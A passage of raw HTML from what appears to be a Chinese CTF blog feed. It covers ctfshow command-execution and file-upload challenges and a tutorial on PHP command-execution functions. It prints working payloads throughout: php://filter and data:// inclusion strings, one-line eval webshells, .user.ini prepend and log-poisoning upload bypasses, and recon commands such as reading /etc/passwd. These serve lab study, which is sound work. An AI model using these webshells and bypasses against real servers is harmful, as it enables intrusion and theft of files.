class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><h4 id="方法1-5"><a href="#方法1-5" class="headerlink" title="方法1"></a>方法1</h4><p>多过滤了一个冒号，也不影响我们使用上面的方法</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>🤔<br>ps:此处多过滤了&lt;&#x3D;，与上题题解一样</p><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>😝<br>ps:此处过滤了数字</p><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br><br>    &#125;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>过滤了flag ，又是 include 文件包含</p><h4 id="方法1-6"><a href="#方法1-6" class="headerlink" title="方法1"></a>方法1</h4><p>利用伪协议读flag</p><blockquote><p>data:&#x2F;&#x2F;，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</p></blockquote><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fl*&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fl*&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h4 id="方法2-3"><a href="#方法2-3" class="headerlink" title="方法2"></a>方法2</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></code></pre></td></tr></table></figure><p>base64解码为<code>&lt;?php system(&#39;cat flag.php&#39;);?&gt;</code><br>查看源码即可得到flag</p><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p>原理同上一题，多了个php过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></code></pre></td></tr></table></figure><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p> 过滤了flag,限制了.php后缀<br>data:&#x2F;&#x2F;text&#x2F;plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用<br>flag使用*绕过</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fl*&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fl*&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>查看源码即可得到flag<br>这样就相当于执行了php语句<?php system('cat f*')?>.php</p><h2 id="Web-40"><a href="#Web-40" class="headerlink" title="Web 40"></a>Web 40</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>过滤了引号、美元符号、冒号，这里可以构造无参数函数进行文件读取，正则中的括号不是英文的 是过滤了中文的括号</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">/?c=show<span class="hljs-constructor">_source(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">getcwd</span>()</span>))));<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow文件上传</title>
    <link href="/2023/04/24/%E5%88%B7%E9%A2%98/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2023/04/24/%E5%88%B7%E9%A2%98/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="151"><a href="#151" class="headerlink" title="151"></a>151</h2><p>绕过前端验证<br>方法1：直接关闭浏览器的js<br>方法2：上传.png（只能是png，gif和jpg都不行）文件然后bp抓包后修改后缀为.php,内容为一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="152"><a href="#152" class="headerlink" title="152"></a>152</h2><p>上传 shell.php然后抓包修改content-type为 image&#x2F;png或者上传.png文件后修改后缀为.php</p><p>直接访问upload&#x2F;shell.php然后 post传<strong>1&#x3D;system(‘tac …&#x2F;f*’);</strong> flag在当前文件所在位置的上一层。</p><h2 id="153"><a href="#153" class="headerlink" title="153"></a>153</h2><p>上传user.ini进行文件上传绕过。<br><strong>auto_prepend_file&#x3D;shell.png</strong><br>上传一句话木马，bp抓包修改后缀，用蚁剑连接</p><h2 id="154，155"><a href="#154，155" class="headerlink" title="154，155"></a>154，155</h2><p>上传正常的图片马失败，发现是过滤的&lt;xphp 其中的x是任意字</p><p>使用短标签绕过<br>1 前提是开启配置参数short_open_tags&#x3D;on</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>;<span class="hljs-meta">?&gt;</span><br><br><br></code></pre></td></tr></table></figure><p>2 不需要开启参数设置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>(表达式)<span class="hljs-meta">?&gt;</span>  等价于 <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> (表达式)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>3 前提是开启配置参数asp_tags&#x3D;on</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&lt;<span class="hljs-meta">%</span> echo <span class="hljs-string">&#x27;123&#x27;</span>;<span class="hljs-meta">%</span>&gt;<br></code></pre></td></tr></table></figure><p>4 不需要修改参数开关，但是只能在7.0以下可用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript">echo <span class="hljs-string">&#x27;123&#x27;</span>; </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="156"><a href="#156" class="headerlink" title="156"></a>156</h2><p>在前面的基础上过滤了 <code>[]</code>那我们直接用{}来代替<br>图片马内容&#96;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>&#123;<span class="hljs-number">1</span>&#125;);<span class="hljs-meta">?&gt;</span>`<br></code></pre></td></tr></table></figure><h2 id="157，158，159"><a href="#157，158，159" class="headerlink" title="157，158，159"></a>157，158，159</h2><p>过滤了{}和分号，那就直接输出flag</p><p>图片马内容</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span><span class="hljs-string">`tac ../f*`</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-meta">&lt;?</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac ../f*&#x27;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="159"><a href="#159" class="headerlink" title="159"></a>159</h2><p>过滤了括号，那就用反引号就可以</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span><span class="hljs-string">`tac ../f*`</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="160"><a href="#160" class="headerlink" title="160"></a>160</h2><p>利用日志包含绕过<strong>包含日志文件getshell</strong><br>上传.user.ini文件（.png抓包修改）<br>上传shell文件（拼接绕过log过滤）</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;/var/lo&quot;</span>.<span class="hljs-string">&quot;g/nginx/access.lo&quot;</span>.<span class="hljs-string">&quot;g&quot;</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>修改ua头信息</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-meta">&lt;?</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac ../f*&#x27;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问&#x2F;upload&#x2F;index.php得到flag</p><h2 id="161"><a href="#161" class="headerlink" title="161"></a>161</h2><p>与160一致，加了GIF89a</p>]]></content>
    
    
    <categories>
      
      <category>刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行</title>
    <link href="/2023/04/21/web%E5%AD%A6%E4%B9%A0/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2023/04/21/web%E5%AD%A6%E4%B9%A0/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行漏洞简介："><a href="#命令执行漏洞简介：" class="headerlink" title="命令执行漏洞简介："></a>命令执行漏洞简介：</h1><h4 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h4><p>未对用户输入进行检查过滤，导致用户输入的参数被应用当成命令来执行。 命令执行漏洞是指应用有时需要调用一些执行系统命令的函数，如：system()、exec()、shell_exec()、eval()、passthru()等函数，代码未对用户可控参数做过滤，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。</p><h4 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h4><ol><li><p>继承 Web 服务程序的权限去执行系统命令或读写文件  </p></li><li><p>反弹 shell ，获得目标<a href="https://cloud.tencent.com/product/cvm?from=20065&from_column=20065">服务器</a>的权限  </p></li><li><p>进一步内网渗透</p></li></ol><h2 id="PHP代码执行函数"><a href="#PHP代码执行函数" class="headerlink" title="PHP代码执行函数"></a><strong>PHP代码执行函数</strong></h2><h3 id="1-eval"><a href="#1-eval" class="headerlink" title="1.eval"></a><strong>1.eval</strong></h3><blockquote><p> 在一些<a href="https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F%E8%AA%9E%E8%A8%80">程序语言</a>中，<strong>eval</strong> 是一个把字符串当作表达式执行而返回一个结果的函数；在另一些之中，它执行多行的代码就好像它们被包括在其中，而不是包括 <code>eval</code> 的这一行。<code>eval</code> 的输入不一定是字符串；在支持句法抽象的语言（如 <a href="https://zh.wikipedia.org/wiki/Lisp">Lisp</a>）中，<code>eval</code> 的输入将会由抽象句法形式组成。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>eval() 函数传入的参数必须为PHP代码，即要以<strong>分号结尾</strong>； </p><p>弊端：eval函数可以执行任意php代码</p><h3 id="2-assert"><a href="#2-assert" class="headerlink" title="2.assert"></a>2.<strong>assert</strong></h3><blockquote><p> 断言函数，用于在调试过程中捕捉程序的错误。  “断言”在语文中的意思是“断定”、“十分肯定地说”，在编程中是指对某种假设条件进行检测，如果条件成立就不进行任何操作，如果条件不成立就捕捉到这种错误，并打印出错误信息，终止程序执行。 <strong>如果 <code>assertion</code> 是字符串，它将会被 assert() 当做 PHP 代码来执行。</strong></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])<span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p><strong>不需要</strong>以分号结尾</p><h3 id="3-preg-replace"><a href="#3-preg-replace" class="headerlink" title="3. preg_replace"></a><strong>3. preg_replace</strong></h3><blockquote><p>  preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )   </p><p> preg_replace — 执行一个正则表达式的搜索和替换 </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   <br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/test/e&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>],<span class="hljs-string">&quot;just test&quot;</span>); <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p> <strong>&#x2F;&#x2F;preg_replace</strong>(‘ 正则规则 ‘,’ 替换字符 ‘ ， ‘ 目标字符 ‘)  </p><p> <strong>&#x2F;&#x2F;PCRE修饰符 e</strong>   ： preg_replace() 在进行了对替换字符串的后向引用替换之后 ,  将替换后的字符串作为 php 代码评估执行 (eval 函数方式 ),  并使用执行结果作为实际参与替换的字符串 </p><h3 id="4-array-map"><a href="#4-array-map" class="headerlink" title="4. array_map"></a><strong>4. array_map</strong></h3><blockquote><p>  array_map ( callable callback,arrayarray1 [, array  ) </p></blockquote><p>将函数作用到数组中的每个值上，每个值都乘以本身，并返回带有新值的数组 </p><p> <strong>数组的每个元素应用回调函数</strong> </p><blockquote>   <?php    $func=$_GET['func'];    $cmd=$_POST['cmd'];    $array[0]=$cmd;    $new_array=array_map($func,$array);    echo $new_array;    //array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定    义函数作用后的带有新值的数组。    ?></blockquote><h3 id="5-create-function"><a href="#5-create-function" class="headerlink" title="5. create_function"></a><strong>5. create_function</strong></h3><blockquote><p> create_function（字符串args、字符串code）：字符串 </p></blockquote><p> 从传递的参数动态创建函数，并为其返回唯一名称。</p><blockquote>  <?php    $func = create_function('',$_POST['cmd']);$func();    **//创建匿名函数执行代码**    ?></blockquote><h3 id="6-call-user"><a href="#6-call-user" class="headerlink" title="6. call_user_"></a><strong>6. call_user_</strong></h3><blockquote><p> call_user_func ( callable callback[,mixedparameter [, mixed  </p></blockquote><p><strong>call_user_func — 把第一个参数作为回调函数调用</strong></p><blockquote>   <?php    call_user_func("assert",$_POST['cmd']);    **//传入的参数作为assert函数的参数**    **//cmd=system(whoami)**    ?></blockquote><h3 id="7-call-user-func-array"><a href="#7-call-user-func-array" class="headerlink" title="7. call_user_func_array"></a><strong>7. call_user_func_array</strong></h3><blockquote><p> call_user_func_array(callable callback,arrayargs): mixed </p></blockquote><p> <strong>把第一个参数作为回调函数（<code>callback</code>）调用，把参数数组作（<code>args</code>）为回调函数的的参数传入。</strong></p><blockquote>   <?php    $cmd=$_POST['cmd'];    $array[0]=$cmd;    call_user_func_array("assert",$array);    **//将传入的参数作为数组的第一个值传递给assert函数**    **//cmd=system(whoami)**    ?></blockquote><h3 id="8-array-filter"><a href="#8-array-filter" class="headerlink" title="8. array_filter"></a><strong>8. array_filter</strong></h3><blockquote><p>   array_filter ( array $array [, callable $callback [, int $flag &#x3D; 0 ]] )   </p></blockquote><p><strong>用回调函数过滤数组中的元素</strong> </p><p>array_filter() 函数用回调函数过滤数组中的值。</p><p><strong>该函数把输入数组中的每个键值传给回调函数。如果回调函数返回 true，则把输入数组中的当前键值返回结果数组中。数组键名保持不变。</strong></p><blockquote>  <?php    $cmd=$_POST['cmd'];    $array1=array($cmd);    $func =$_GET['func'];    array_filter($array1,$func);    **//用回调函数过滤数组中的元素：array_filter(数组,函数)**    **//?func=system**    **//cmd=whoami**    ?></blockquote><h3 id="9-双引号"><a href="#9-双引号" class="headerlink" title="9. 双引号"></a><strong>9. 双引号</strong></h3><blockquote>  <?php    **// echo "phpinfo()";**    echo "{${phpinfo()}}";    ?></blockquote><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><blockquote><ol><li><code>dir</code> 列出目录</li><li><code>ipconfig</code> 查看ip</li><li><code>arp -a</code> 查看路由表</li><li><code>calc</code> 打开计算器</li><li><code>regedit</code> 打开注册表</li><li><code>netstat -ano</code> 查看服务器端口信息</li></ol></blockquote><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><blockquote><ol><li>cat &#x2F;etc&#x2F;passwd 查看password文件内容</li><li>id 查看当前用户的id号（Windows中500表示admin，501表示游客，自定义用户100以上）</li><li>cat &#x2F;etc&#x2F;group 查看用户组文件内容</li><li>pwd 显示当前目录</li><li>uname -a 查看当前系统版本</li><li>natstat -pantu 查看当前服务器的端口信息</li><li>netstat -nr 查看网关和路由</li></ol></blockquote><h2 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h2><h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>直接在终端打印返回结果，成功则返回命令输出的最后一行，失败则返回FALSE<br>system(shell命令,shell命令的返回结果0或1)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(‘cmd.bat’,<span class="hljs-variable">$callback</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$callback</span>;<br><span class="hljs-meta">?&gt;</span>   <span class="hljs-comment">//使用system()函数来去除系统垃圾，$callback变量为被执行文件执行后的输出信息。</span><br></code></pre></td></tr></table></figure><h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h4><p>执行外部程序并且显示原始输出,只调用命令，不返回任何结果，但把命令的运行结果原样地直接输出到标准输出设备上。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>     <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><br>执行结果：index.phptest.php<br></code></pre></td></tr></table></figure><h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>执行一个外部程序,命令执行结果的最后一行内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;ls&quot;</span>,<span class="hljs-variable">$output</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//$output：数组格式，用于存储输出的信息</span><br><br>执行结果：<br>test.php<br><span class="hljs-title function_ invoke__">Array</span>( [<span class="hljs-number">0</span>] =&gt; index.php [<span class="hljs-number">1</span>] =&gt; test.php)<br></code></pre></td></tr></table></figure><h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h4><p>在当前进程空间执行指定程序</p><h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h4><p>命令执行的输出。如果执行过程中发生错误或者进程不产生输出，则返回NULL。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$result</span> = shell_exec($cmd);</span><br><br><span class="hljs-meta"><span class="hljs-keyword">$cmd</span>：shell脚本</span><br><span class="hljs-meta"><span class="hljs-keyword">$result</span>：shell脚本的执行结果</span><br></code></pre></td></tr></table></figure><h4 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h4><p>函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行。<br>resource popen ( 执行的命令 , 指针文件的连接模式包括读r和写w)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">popen</span>( <span class="hljs-string">&#x27;whoami &gt;&gt; c:/1.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span> ); <span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span>  <br>    <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;ls /tmp/test&quot;</span>;  <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-variable">$test</span>,<span class="hljs-string">&quot;r&quot;</span>);  <span class="hljs-comment">//popen打一个进程通道  </span><br><br><span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123;      <span class="hljs-comment">//从通道里面取得东西  </span><br>    <span class="hljs-variable">$out</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">4096</span>);  <br>     <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$out</span>;         <span class="hljs-comment">//打印出来  </span><br>&#125;  <br><span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$fp</span>);  <br><br><span class="hljs-meta">?&gt;</span> <br><br><br></code></pre></td></tr></table></figure><h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h4><p>与popen()函数相似，区别是前者提供的是双向通道</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 